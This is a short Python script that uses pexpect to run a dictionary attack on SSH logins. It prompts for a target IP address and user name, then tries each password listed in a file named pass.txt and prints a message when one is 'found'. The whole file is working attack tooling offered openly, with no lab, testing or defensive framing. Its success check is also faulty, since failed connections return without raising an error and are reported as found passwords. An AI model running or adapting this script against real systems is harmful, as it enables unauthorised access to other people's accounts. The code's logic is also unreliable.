#!/usr/bin/python

import pexpect

PROMPT= ['#','>>>','>','\$']

def connect(user,host,password):
	ssh_key = 'Are you sure you want to continue connecting'
	keyStr = 'ssh'+" "+user+'@'+host
	child = pexpect.spawn(keyStr)
	ret = child.expect([pexpect.TIMEOUT,ssh_key,'[P|p]assword:'])
	if ret == 0:
		print ("[-] Error Connecting")
		return
	if ret == 1:
		child.sendline('yes')
		ret  = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
		if ret == 0:
			print ('[-] Error Connecting')
			return
	child.sendline(password)
	child.expect(PROMPT,timeout=1)
	return child


def main():
	host = raw_input("Enter Target IP Address: ")
	user = raw_input("Enter Target User Name: ")
	file = open('pass.txt','r')
	for password in file.readlines():
		password = password.strip("\n")
		try:
			child = connect(user,host,password)
			print ("[+] Password For "+user + " Found " + "And The Passsword is: "+ password)
		except:
			print ("[-] Password Not Found........!!!!!!!")
main() 
